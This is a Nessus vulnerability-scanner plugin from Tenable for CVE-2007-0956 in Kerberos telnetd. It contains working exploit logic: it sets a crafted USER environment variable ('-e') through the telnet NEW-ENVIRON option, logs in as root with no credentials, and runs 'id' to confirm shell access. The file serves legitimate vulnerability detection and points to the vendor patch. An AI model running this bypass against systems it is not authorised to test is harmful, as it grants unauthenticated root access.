#
# (C) Tenable Network Security, Inc.
#


# Need Nessus 2.2.9 or newer
if (NASL_LEVEL < 2204 ) exit(0);

include("compat.inc");

if (description) {
  script_id(24998);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2007-0956");
  script_bugtraq_id(23281);
  script_xref(name:"OSVDB", value:"34106");

  script_name(english:"Kerberos telnet Crafted Username Remote Authentication Bypass");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to log into the remote system using telnet without
supplying any credentials" );
 script_set_attribute(attribute:"description", value:
"The remote version of kerberos telnet does not sanitize the
user-supplied 'USER' environement variable.  By supplying a specially
malformed USER environment variable, an attacker may force the remote
telnet server to believe that the user has already authenticated." );
 script_set_attribute(attribute:"solution", value:
"Apply the patch below or contact your vendor for a patch :

http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2007-001-telnetd.txt" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C" );
 script_end_attributes();

 
  script_summary(english:"Attempts to log in as -e");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/telnet", 23);
  exit(0);
}


include ("telnet2_func.inc");

port = get_kb_item("Services/telnet");
if (!port) port = 23;

global_var rcvdata, idsent, idstate;

function telnet_callback ()
{
 local_var data;
 data = _FCT_ANON_ARGS[0];

 if (data && ord(data[0]) != 0x00 && ord(data[0]) != 0x0d)
   rcvdata += data[0];


 if ( (idstate == 0 && (egrep(pattern:"login:", string:rcvdata, icase:TRUE))) || 
      egrep(pattern:"(password|usage):", string:rcvdata, icase:TRUE) )
 {
  exit(0);
 }

 if (idstate == 0)
 {
  telnet_write('plop\r\0');
  telnet_write('\0\r\0');
  rcvdata = NULL;
  idstate = 1;
 } 

 if (idstate == 1 && "login: login:" >< rcvdata)
 {
  rcvdata = NULL;
  telnet_write('root\r\0');
  telnet_write('id\r\0');
  idstate = 2;
 }

 if (idstate == 2 && "uid=" >< rcvdata)
 {
  security_hole(port:port, extra:'It was possible to log in and execute "id" : \n\n' + egrep(pattern:"uid=", string:rcvdata));
  telnet_write('exit\r\0');
  exit(0);
 }
}


rcvdata = NULL;
idstate = 0;

env_data = 
	mkbyte(0) +
	mkbyte(0) + "USER" +
	mkbyte(1) + "-e";

options = NULL;
options[0] = make_list(OPT_NEW_ENV, env_data);

if (!telnet2_init(options:options, timeout:10))
  exit(0);

telnet_loop();




